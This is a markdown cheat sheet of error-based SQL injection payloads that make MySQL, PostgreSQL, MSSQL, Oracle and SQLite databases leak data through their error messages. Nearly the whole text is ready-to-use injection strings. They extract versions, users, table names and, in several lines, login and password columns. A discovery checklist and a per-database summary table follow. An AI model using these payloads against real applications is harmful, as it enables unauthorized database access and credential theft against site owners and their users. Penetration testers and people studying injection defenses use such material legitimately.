# Error-based SQLi — make the DBMS leak data in its complaint

Faster than blind: each request returns actual BYTES in the error
message, not one bit. Use whenever the app shows driver/DBMS error
text (even a sanitized "something went wrong" sometimes leaks the
value inside a debug block, a comment, or an X-Debug header — grep
the whole response, not just the rendered page).

---

## 1. MySQL / MariaDB — the four workhorses

### extractvalue / updatexml (XPATH errors)

```sql
' AND extractvalue(1,concat(0x7e,(SELECT version())))-- -
' AND extractvalue(1,concat(0x7e,(SELECT user())))-- -
' AND extractvalue(1,concat(0x7e,(SELECT database())))-- -
' AND updatexml(1,concat(0x7e,(SELECT @@hostname)),1)-- -
' AND updatexml(1,concat(0x7e,(SELECT table_name FROM
    information_schema.tables WHERE table_schema=database()
    LIMIT 0,1)),1)-- -
```

Error comes back as `XPATH syntax error: '~5.7.42-log'` — the
payload inside the quotes. Limits: output truncated to ~32 chars
(MariaDB ~80). Page with substring:

```sql
extractvalue(1,concat(0x7e,substring((SELECT group_concat(table_name)
  FROM information_schema.tables WHERE table_schema=database()),1,30)))
extractvalue(1,concat(0x7e,substring((SELECT group_concat(table_name)
  FROM information_schema.tables WHERE table_schema=database()),31,30)))
```

### DOUBLE/floor-rand duplicate entry

```sql
' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(0x7e,(SELECT version()),
   FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)-- -
' UNION SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT user()),
   FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a-- -
```

Returns `Duplicate entry '~root@localhost~1' for key 'group_key'`.
Classic, works on MySQL < 8 (still works on 8 in most builds); needs
a table with ≥3 rows to trip the rand collision — information_schema
tables qualify.

### GTID functions (5.7+/8.0)

```sql
' AND GTID_SUBSET(CONCAT(0x7e,(SELECT version())),1)-- -
' AND GTID_SUBSET(CONCAT(0x7e,(SELECT user()),':',@@version),7770)-- -
' AND GTID_SUBTRACT(CONCAT(0x7e,(SELECT database())),1)-- -
```

No length limit like extractvalue — full string in
`Malformed GTID set specification '~...'`.

### JSON path errors (5.7+)

```sql
' AND JSON_KEYS((SELECT CONCAT(version())))-- -
' AND (SELECT JSON_TABLE((SELECT CONCAT('["',version(),'"]')),'$[*]'
   COLUMNS(x INT PATH '$'))t)-- -
' AND ST_GeomFromText((SELECT CONCAT('POINT(',version(),')')))-- -
' AND ST_LatFromGeoHash((SELECT version()))-- -
' AND ST_PointFromGeoHash((SELECT version()),1)-- -
' AND ST_LongFromGeoHash((SELECT version()))-- -
' AND ST_GeomCollFromText((SELECT version()))-- -
' AND ST_PolyFromWKB((SELECT version()),1)-- -
```

The `ST_*` family echoes the bad argument verbatim — good when
XPATH functions are filtered.

### misc MySQL error sources

```sql
' AND 1=(SELECT 1 UNION SELECT 2)-- -         -- 'Subquery returns more
                                            --  than 1 row' — boolean channel
' AND row(1,1)>(SELECT COUNT(*),0x3a,
   CONCAT(version(),0x3a,floor(rand()*2))x FROM
   information_schema.columns GROUP BY x)-- -  -- another dup-entry variant
' AND EXP(~(SELECT * FROM (SELECT version())a))-- -  -- no echo but error
' AND (SELECT * FROM (SELECT NAME_CONST(version(),1),NAME_CONST(
   version(),1))x)-- -                          -- NAME_CONST dup column
' AND polygon((SELECT * FROM (SELECT * FROM
   (SELECT @@version)a)b)c)-- -
' AND linestring((SELECT * FROM (SELECT * FROM
   (SELECT user())a)b)c)-- -
```

---

## 2. PostgreSQL — cast errors

PG errors print the failing VALUE — the whole channel is one cast:

```sql
' AND CAST(version() AS int)-- -
' AND 1=CAST(current_user AS int)-- -
' AND 1=CAST((SELECT string_agg(table_name,',' || chr(10))
    FROM information_schema.tables) AS int)-- -
' AND 1=CAST((SELECT usename FROM pg_user LIMIT 1) AS int)-- -
' AND 1=(SELECT CAST(login||':'||password AS int) FROM users
    LIMIT 1)-- -
```

Error: `invalid input syntax for type integer: "PostgreSQL 15.4..."`.

Also:

```sql
' AND 1=1/(SELECT 0)-- -                     -- division by zero check
' AND (SELECT 1/0 FROM users LIMIT 1)=1-- -
' AND (SELECT to_date('a','x'))=1-- -
' AND (SELECT '' || (SELECT version())::int)=1-- -
```

Conditional-error oracle (for blind→error upgrade):

```sql
' AND (SELECT CASE WHEN (ASCII(SUBSTRING(current_database(),1,1))>100)
   THEN CAST('x' AS int) ELSE 1 END)=1-- -
```

---

## 3. MSSQL — convert errors

```sql
' AND 1=CONVERT(int,@@version)-- -
' AND 1=CONVERT(int,(SELECT TOP 1 name FROM master..sysdatabases))-- -
' AND 1=CONVERT(int,(SELECT TOP 1 name FROM sys.tables))-- -
' AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM
    information_schema.tables))-- -
' AND 1=CONVERT(int,(SELECT TOP 1 loginame FROM sys.sysprocesses))-- -
' AND 1=(SELECT CAST(@@version AS int))-- -        -- CAST alias
' AND 1=CONVERT(int,(SELECT TOP 1 col FROM users
    ORDER BY id))-- -
```

Error: `Conversion failed when converting the varchar value
'Microsoft SQL Server 2019...' to data type int.` — value echoed.

More:

```sql
' AND 1 IN (SELECT TOP 1 CAST(name AS int) FROM sys.tables)-- -
' AND (SELECT TOP 1 CAST(password AS int) FROM users)=1-- -
' AND 1=(SELECT COUNT(*) FROM sysusers WHERE
   1=CONVERT(int,@@servername))-- -
```

Stacked form (when the driver allows):

```sql
'; SELECT 1/0-- -
'; DECLARE @x int; SET @x=1; SET @x=(SELECT @@version); SELECT @x-- -
```

---

## 4. Oracle — custom error functions

```sql
' AND 1=CTXSYS.DRITHSX.SN(1,(SELECT user FROM dual))-- -
' AND 1=CTXSYS.DRITHSX.SN(1,(SELECT banner FROM v$version
    WHERE rownum=1))-- -
' AND 1=ORDSYS.ORD_DICOM.GETMAPPINGXPATH((SELECT user FROM dual)
    ,user,user)-- -
' AND 1=(SELECT UTL_INADDR.GET_HOST_NAME((SELECT user FROM dual))
    FROM dual)-- -
' AND 1=SYS.DBMS_XGEN.VERSION()-- -                  -- verbose version
' AND 1=TO_NUMBER((SELECT banner FROM v$version WHERE rownum=1))-- -
' AND 1=(SELECT CTXSYS.CTX_REPORT.TOKEN_TYPE(
    (SELECT user FROM dual),user) FROM dual)-- -
```

`UTL_INADDR.GET_HOST_NAME` also does the OOB lookup (see oob.md).
`DBMS_XMLGEN.GETXML` wraps a query result into the error in 11g.

---

## 5. SQLite — rare but exists

SQLite driver errors rarely echo values, but a few:

```sql
' AND load_extension('x')-- -            -- 'not authorized' confirms
                                        --  sqlite + path info
' AND abs(randomblob(9))-- -
' AND (SELECT CASE WHEN 1=1 THEN 1 ELSE load_extension('x')
   END)-- -                               -- conditional error oracle
' AND (SELECT CAST(x'4141' AS int))=1-- - -- no echo usually
```

Mostly use boolean/time on SQLite.

---

## 6. Error channel discovery checklist

1. `id=1'` produced SQL error text? → error channel live.
2. Error truncated/sanitized? → grep the RAW body incl. headers and
   HTML comments for the marker (`0x7e` = `~` around your payload).
3. No error text but status 500 vs 200? → conditional-error oracle:
   ask yes/no inside CASE that triggers error on true.
4. Error reflects only part of the payload? → put value in a quoted
   arg of the failing function (that is what gets echoed), not the
   outer expression.

---

## 7. Payload assembly cheatsheet

| DBMS | Primary | Backup | Notes |
|---|---|---|---|
| MySQL | extractvalue | floor(rand) dup / GTID_SUBSET | ~32-char limit → substring page |
| Postgres | CAST(x AS int) | 1/0 conditional | echoes value verbatim |
| MSSQL | CONVERT(int,x) | CAST + IN | echoes value verbatim |
| Oracle | CTXSYS.DRITHSX.SN | UTL_INADDR.GET_HOST_NAME | FROM dual required |
| SQLite | (rare) | conditional load_extension | usually blind instead |
